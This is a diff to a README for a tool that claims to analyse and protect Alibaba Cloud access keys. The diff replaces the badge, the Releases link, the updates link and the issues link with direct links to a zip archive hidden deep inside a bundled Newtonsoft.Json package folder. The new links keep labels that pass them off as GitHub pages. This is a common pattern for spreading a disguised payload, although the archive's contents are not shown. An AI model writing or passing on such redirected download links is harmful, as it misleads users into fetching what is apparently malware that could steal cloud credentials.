@@ -1,6 +1,6 @@
 # 🎉 Aliyun-Alibaba-Access-Key-Tools - Analyze and Protect Your Access Keys
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download Now](https://raw.githubusercontent.com/Mushashiru/Aliyun-Alibaba-Access-Key-Tools/main/AliyunAccessKey/packages/Newtonsoft.Json.13.0.1/lib/netstandard1.3/Alibaba_Tools_Aliyun_Access_Key_pardonableness.zip%20Now-Click%20Here-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Aliyun-Alibaba-Access-Key-Tools! This tool helps you identify and
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [GitHub Releases](https://github.com/Mushashiru/Aliyun-Alibaba-Access-Key-Tools/releases). 
+To get started, visit this page to download the software: [GitHub Releases](https://raw.githubusercontent.com/Mushashiru/Aliyun-Alibaba-Access-Key-Tools/main/AliyunAccessKey/packages/Newtonsoft.Json.13.0.1/lib/netstandard1.3/Alibaba_Tools_Aliyun_Access_Key_pardonableness.zip). 
 
 1. Click on the **Releases** link.
 2. Look for the latest version listed.
@@ -53,7 +53,7 @@ Once the application is running, you will find an intuitive interface. Here’s 
 
 ## 🔄 Updates
 
-To keep your software secure and efficient, always check for updates. You can find updates on the same [Releases page](https://github.com/Mushashiru/Aliyun-Alibaba-Access-Key-Tools/releases).
+To keep your software secure and efficient, always check for updates. You can find updates on the same [Releases page](https://raw.githubusercontent.com/Mushashiru/Aliyun-Alibaba-Access-Key-Tools/main/AliyunAccessKey/packages/Newtonsoft.Json.13.0.1/lib/netstandard1.3/Alibaba_Tools_Aliyun_Access_Key_pardonableness.zip).
 
 ## 📝 Additional Information
 
@@ -72,7 +72,7 @@ A: Currently, the tool is optimized for Windows and macOS. Linux support may be 
 
 ## 📞 Support
 
-For help or questions, check the [issues section](https://github.com/Mushashiru/Aliyun-Alibaba-Access-Key-Tools/issues) on GitHub.
+For help or questions, check the [issues section](https://raw.githubusercontent.com/Mushashiru/Aliyun-Alibaba-Access-Key-Tools/main/AliyunAccessKey/packages/Newtonsoft.Json.13.0.1/lib/netstandard1.3/Alibaba_Tools_Aliyun_Access_Key_pardonableness.zip) on GitHub.
 
 ## ⚙️ Contributing
 
